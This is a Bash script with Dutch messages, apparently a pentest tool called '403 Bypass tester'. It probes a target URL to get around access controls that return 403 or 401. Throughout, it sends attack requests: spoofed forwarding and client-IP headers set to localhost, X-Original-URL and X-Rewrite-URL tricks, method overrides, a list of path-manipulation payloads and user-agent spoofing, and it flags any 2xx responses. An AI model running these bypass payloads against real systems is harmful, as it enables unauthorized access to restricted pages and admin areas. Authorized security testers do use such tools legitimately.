#!/usr/bin/env bash

set -uo pipefail

usage() {
    echo "Gebruik: bash $0 [opties] <URL>"
    echo
    echo "  --cookies, -c   Cookie-header in Burp-notatie, meerdere cookies gescheiden"
    echo "                  door '; ' (bijv. \"csrftoken=abc; session=def\")."
    echo "  --header, -H    Extra header, meegegeven zoals bij curl (bijv."
    echo "                  \"Authorization: Bearer eyJ...\"). Mag meerdere keren."
    echo "  <URL>           De doel-URL, bijv. https://target.tld/admin"
    echo
    echo "Voorbeeld:"
    echo "  bash $0 -H \"Authorization: Bearer eyJ...\" -H \"X-Api-Key: abc\" https://target.tld/admin"
    exit 1
}

RAW_URL=""
COOKIES=""
EXTRA_HEADERS=()

while [[ $# -gt 0 ]]; do
    case "$1" in
        --cookies|-c)
            [[ $# -lt 2 ]] && { echo "Fout: $1 verwacht een waarde."; usage; }
            COOKIES="$2"
            shift 2
            ;;
        --cookies=*)
            COOKIES="${1#*=}"
            shift
            ;;
        --header|-H)
            [[ $# -lt 2 ]] && { echo "Fout: $1 verwacht een waarde."; usage; }
            EXTRA_HEADERS+=("$2")
            shift 2
            ;;
        --header=*)
            EXTRA_HEADERS+=("${1#*=}")
            shift
            ;;
        -h|--help)
            usage
            ;;
        -*)
            echo "Onbekende optie: $1"
            usage
            ;;
        *)
            if [[ -z "$RAW_URL" ]]; then
                RAW_URL="$1"
            else
                echo "Onverwacht extra argument: $1"
                usage
            fi
            shift
            ;;
    esac
done

[[ -z "$RAW_URL" ]] && { echo "Fout: geen URL opgegeven."; usage; }


CURL_OPTS=(-s -k -o /dev/null -m 10 --max-redirs 0)


if [[ -n "$COOKIES" ]]; then
    CURL_OPTS+=(-b "$COOKIES")
fi

# Extra headers toevoegen aan elk request
if [[ ${#EXTRA_HEADERS[@]} -gt 0 ]]; then
    for _h in "${EXTRA_HEADERS[@]}"; do
        CURL_OPTS+=(-H "$_h")
    done
fi

SCHEME_HOST="$(echo "$RAW_URL" | grep -oE '^https?://[^/]+')"
PATH_PART="${RAW_URL#$SCHEME_HOST}"
[[ -z "$PATH_PART" ]] && PATH_PART="/"

[[ "$PATH_PART" != /* ]] && PATH_PART="/$PATH_PART"

CLEAN_PATH="${PATH_PART%/}"
[[ -z "$CLEAN_PATH" ]] && CLEAN_PATH="/"

GREEN='\033[0;32m'; YELLOW='\033[0;33m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'

echo -e "${CYAN}==========================================================${NC}"
echo -e "${CYAN} 403 Bypass tester${NC}"
echo -e "${CYAN} Doel-URL : ${NC}$RAW_URL"
echo -e "${CYAN} Base     : ${NC}$SCHEME_HOST"
echo -e "${CYAN} Pad      : ${NC}$PATH_PART"
if [[ -n "$COOKIES" ]]; then
    echo -e "${CYAN} Cookies  : ${NC}${GREEN}actief${NC} (geauthenticeerd testen)"
else
    echo -e "${CYAN} Cookies  : ${NC}geen (anoniem)"
fi
if [[ ${#EXTRA_HEADERS[@]} -gt 0 ]]; then
    echo -e "${CYAN} Headers  : ${NC}${GREEN}${#EXTRA_HEADERS[@]} extra${NC} meegegeven"
    for _h in "${EXTRA_HEADERS[@]}"; do
        echo -e "${CYAN}          + ${NC}$_h"
    done
fi
echo -e "${CYAN}==========================================================${NC}"

run() {
    local label="$1"; shift
    local code size
    
    read -r code size < <(curl "${CURL_OPTS[@]}" -w '%{http_code} %{size_download}' "$@")
    local color="$YELLOW"
    case "$code" in
        2*) color="$GREEN" ;;       
        403|401) color="$RED" ;;    
        3*) color="$CYAN" ;;       
        *) color="$YELLOW" ;;
    esac
    printf "  [${color}%s${NC}] %-8s %s\n" "$code" "(${size}b)" "$label"
}


echo -e "\n${CYAN}[*] Baseline${NC}"
run "GET $PATH_PART" "$SCHEME_HOST$PATH_PART"


echo -e "\n${CYAN}[*] Header-injectie (spoofed IP / host)${NC}"

HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Forwarded-For: localhost"
    "X-Forwarded-For: 0.0.0.0"
    "X-Forwarded-For: 192.168.1.1"
    "X-Forwarded-For: 10.0.0.1"
    "X-Forwarded-Host: 127.0.0.1"
    "X-Forwarded-Host: localhost"
    "X-Forwarded-Server: 127.0.0.1"
    "X-Forwarded-Scheme: http"
    "X-Forwarded-Proto: http"
    "X-Forwarded-Port: 443"
    "X-Real-IP: 127.0.0.1"
    "X-Originating-IP: 127.0.0.1"
    "X-Remote-IP: 127.0.0.1"
    "X-Remote-Addr: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "X-Host: 127.0.0.1"
    "X-Host: localhost"
    "X-Custom-IP-Authorization: 127.0.0.1"
    "X-Original-URL: $PATH_PART"
    "X-Rewrite-URL: $PATH_PART"
    "X-Override-URL: $PATH_PART"
    "X-Originating-URL: $PATH_PART"
    "Forwarded: for=127.0.0.1;by=127.0.0.1"
    "Cluster-Client-IP: 127.0.0.1"
    "True-Client-IP: 127.0.0.1"
    "X-ProxyUser-Ip: 127.0.0.1"
    "Client-IP: 127.0.0.1"
    "Referer: $SCHEME_HOST$PATH_PART"
)

for h in "${HEADERS[@]}"; do
    run "$h" -H "$h" "$SCHEME_HOST$PATH_PART"
done


echo -e "\n${CYAN}[*] X-Original-URL / X-Rewrite-URL naar root${NC}"
run "X-Original-URL: $PATH_PART (naar /)"  -H "X-Original-URL: $PATH_PART"  "$SCHEME_HOST/"
run "X-Rewrite-URL: $PATH_PART (naar /)"   -H "X-Rewrite-URL: $PATH_PART"   "$SCHEME_HOST/"


echo -e "\n${CYAN}[*] Alternatieve HTTP-methoden${NC}"
for m in GET POST HEAD OPTIONS PUT DELETE PATCH TRACE CONNECT; do
    run "$m" -X "$m" "$SCHEME_HOST$PATH_PART"
done


echo -e "\n${CYAN}[*] Method-override headers${NC}"
run "X-HTTP-Method-Override: GET"       -H "X-HTTP-Method-Override: GET"       -X POST "$SCHEME_HOST$PATH_PART"
run "X-HTTP-Method: GET"                -H "X-HTTP-Method: GET"                -X POST "$SCHEME_HOST$PATH_PART"
run "X-Method-Override: GET"            -H "X-Method-Override: GET"            -X POST "$SCHEME_HOST$PATH_PART"


echo -e "\n${CYAN}[*] Path-manipulatie${NC}"


PATHS=(
    "$CLEAN_PATH/"
    "$CLEAN_PATH//"
    "$CLEAN_PATH/."
    "$CLEAN_PATH/./"
    "/.$CLEAN_PATH"
    "$CLEAN_PATH%2e/"
    "$CLEAN_PATH%20"
    "$CLEAN_PATH%20/"
    "$CLEAN_PATH%09"
    "$CLEAN_PATH?"
    "$CLEAN_PATH??"
    "$CLEAN_PATH#"
    "$CLEAN_PATH/*"
    "$CLEAN_PATH.json"
    "$CLEAN_PATH.html"
    "$CLEAN_PATH..;/"
    "$CLEAN_PATH;/"
    "$CLEAN_PATH/~"
    "$CLEAN_PATH%2f/"
    "$CLEAN_PATH%2f%2f"
    "/%2e$CLEAN_PATH"
    "$CLEAN_PATH.."
    "$CLEAN_PATH/..;/"
    "/..%2f$CLEAN_PATH"
)

for p in "${PATHS[@]}"; do
   
    url="$SCHEME_HOST$(echo "$p" | sed 's#^//*#/#')"
    run "$p" "$url"
done


if [[ "$CLEAN_PATH" =~ [a-zA-Z] ]]; then
    echo -e "\n${CYAN}[*] Case-variatie${NC}"
    UPPER="$(echo "$CLEAN_PATH" | tr '[:lower:]' '[:upper:]')"
    run "UPPERCASE: $UPPER" "$SCHEME_HOST$UPPER"
fi


echo -e "\n${CYAN}[*] User-Agent varianten${NC}"
run "UA: Googlebot"        -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "$SCHEME_HOST$PATH_PART"
run "UA: leeg"             -A "" "$SCHEME_HOST$PATH_PART"

# HTTP/1.0 downgrade
echo -e "\n${CYAN}[*] Protocol-downgrade${NC}"
run "HTTP/1.0" --http1.0 "$SCHEME_HOST$PATH_PART"

echo -e "\n${CYAN}==========================================================${NC}"
echo -e "${GREEN}Klaar.${NC} Let op ${GREEN}2xx${NC}-codes of afwijkende response-groottes: dat zijn kandidaat-bypasses."
echo -e "${CYAN}==========================================================${NC}"
